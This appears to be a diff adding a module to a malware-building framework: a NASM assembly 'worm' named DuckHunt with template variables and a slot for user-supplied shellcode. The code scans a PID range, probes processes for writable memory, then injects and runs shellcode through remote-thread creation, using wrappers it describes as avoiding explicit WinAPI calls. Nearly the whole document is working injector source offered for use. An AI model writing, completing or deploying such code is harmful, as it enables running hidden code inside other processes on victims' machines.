@@ -1,0 +1,217 @@
+#!name##DuckHunt
+#!itemType##worm
+#!info##A simple injector written in assembly. It searches for processes within a specified range, looks for vulnerable processes, injects, and executes shellcode.
+#!info## It is very small and does not explicitly use WinAPI functions.
+#!lang##nasm
+#!wormCompiler##Basic-Nasm
+#!Wprocess##BasicProc
+#!reqMod##DuckTalesLib2
+#!Var##DTL_start##4000##Pid number of the process from which the search for a vulnerable process will begin.##str
+#!Var##DTL_last##9000##Last PID number at which the search will end.##str
+#!payloadSpace##DH_scode##Your shellcode
+
+
+bits 64
+default rel
+
+%define TEST_ALLOC_SIZE 16
+
+
+
+extern ExitProcess
+extern DuckStartTales
+extern exeGetLastError
+extern exeOpenProcess
+extern exeCloseHandle
+extern exeVirtualAllocEx
+extern exeWriteProcessMemory
+extern exeCreateRemoteThread
+
+section .data
+    scode: db {{scTOOL.PutShellcode(DH_scode)}}
+    scode_len: equ $-scode
+    
+    
+    test_byte: db "a", 0
+    start_pid: dw {{DTL_start}}
+    last_pid: dw {{DTL_last}}
+
+section .bss
+    current_pid: resw 1     ; actual PID
+    process_handle: resq 1  ; process handle
+    mem_addr: resq 1    ; memory address
+    
+
+section .text
+    global main
+
+main:
+    sub rsp, 40
+    call Initialize
+    xor rcx, rcx
+    xor rdx, rdx
+    mov cx, [start_pid]
+    mov dx, [last_pid]
+    call HuntProcess
+    
+    call Exit
+
+Initialize:
+; Init function
+    push rbp
+    mov rbp, rsp
+    
+    ; DuckTales init
+    sub rsp, 32
+    call DuckStartTales
+    add rsp, 32
+    
+    ; set 'current_pid' to 'start_pid'
+    lea rax, [current_pid]
+    xor rbx, rbx
+    mov bx, [start_pid]
+    mov [rax], bx
+    
+    pop rbp
+    ret
+
+HuntProcess:
+; find process and inject shellcode
+; IN: RCX - start pid
+; IN: RDX - last pid
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    call FindVulProcess
+    cmp rax, 0
+    je .return
+    mov rcx, rax
+    call InjectShellcode
+    
+    
+    .return:
+        add rsp, 32
+        pop rbp
+        ret
+
+InjectShellcode:
+; inject and execute shellcode in process
+; IN: RCX - process handle
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; proc handle
+    
+    sub rsp, 32
+    ; alloc memory
+    mov rdx, scode_len + 16
+    call exeVirtualAllocEx
+    cmp rax, 0
+    je .error
+    mov [rbp-16], rax   ; save mem addr
+    
+    ; write shellcode
+    mov rcx, [rbp-8]
+    mov rdx, rax
+    lea r8, [scode]
+    mov r9, scode_len
+    call exeWriteProcessMemory
+    cmp rax, 0
+    je .error
+    
+    mov rcx, [rbp-8]
+    mov rdx, [rbp-16]
+    mov r8, 0
+    call exeCreateRemoteThread
+    
+    
+    .return:
+        add rsp, 16 + 32
+        pop rbp
+        ret
+
+    .error:
+        jmp .return
+
+FindVulProcess:
+; finding vulnerable process
+; IN: RCX - start pid
+; IN: RDX - last pid
+; OUT: RAX - Process handle or '0'
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; current pid
+    mov [rbp-16], rdx   ; last pid
+    
+    sub rsp, 32
+    .check_loop:
+        mov rcx, [rbp-8]
+        mov rax, [rbp-16]
+        cmp rcx, rax
+        jg .return
+        call CheckProcess
+        cmp rax, 0
+        je .check_next
+        lea rax, [process_handle]
+        mov rax, [rax]
+    
+    .return:
+        add rsp, 16 + 32
+        pop rbp
+        ret
+     
+    .check_next:
+        mov rax, [rbp-8]
+        inc rax
+        mov [rbp-8], rax
+        jmp .check_loop
+        
+
+CheckProcess:
+; check vulnerable process
+; IN: RCX - pid number
+; OUT: RAX - process handle or '0'
+    push rbp
+    mov rbp, rsp
+    
+    ; Try open process
+    sub rsp, 32
+    call exeOpenProcess
+    cmp rax, 0
+    je .return
+    lea rcx, [process_handle]
+    mov [rcx], rax
+    
+    ;try allocate memory
+    mov rcx, rax
+    mov rdx, TEST_ALLOC_SIZE
+    call exeVirtualAllocEx
+    cmp rax, 0
+    je .return
+    lea rcx, [mem_addr]
+    mov [rcx], rax
+    
+    ;try write memory
+    lea rcx, [process_handle]
+    mov rcx, [rcx]
+    mov rdx, rax
+    lea r8, test_byte
+    mov r9, 1
+    call exeWriteProcessMemory
+    cmp rax, 0
+    je .return
+    lea rax, [process_handle]
+    mov rax, [rax]
+    
+    
+    .return:
+        add rsp, 32
+        pop rbp
+        ret
+
+Exit:
+    sub rsp, 32
+    mov rcx, 0
+    call ExitProcess
